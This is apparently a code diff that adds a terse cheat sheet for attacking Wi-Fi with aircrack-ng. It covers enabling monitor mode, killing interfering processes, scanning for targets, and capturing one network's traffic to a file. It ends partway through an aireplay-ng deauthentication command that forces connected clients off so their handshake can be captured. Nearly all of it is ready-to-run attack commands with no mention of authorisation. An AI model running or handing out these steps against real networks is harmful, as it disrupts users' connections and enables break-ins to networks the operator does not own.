@@ -1,0 +1,9 @@
+//Disconnect from all Wi-Fi.
+1. `sudo airmon-ng` //check for your wifi card under "Interface"
+2. `sudo airmon-ng start wlan0mon` //to start monitoring the network
+3. `sudo airmon-ng check kill` //to kill them. If you see a message that says "Found processes that could cause trouble,"  
+4. `sudo airodump-ng wlan0mon` //to view the results.
+//Find the BSSID and CH
+5. `sudo airodump-ng -c [CH] --bssid [xx:xx:xx:xx:xx:xx] -w Desktop/ wlan0mon`
+//Find a BSSID/STATION pair, this means the client is connected
+6. `sudo aireplay-ng -0 2 -a 
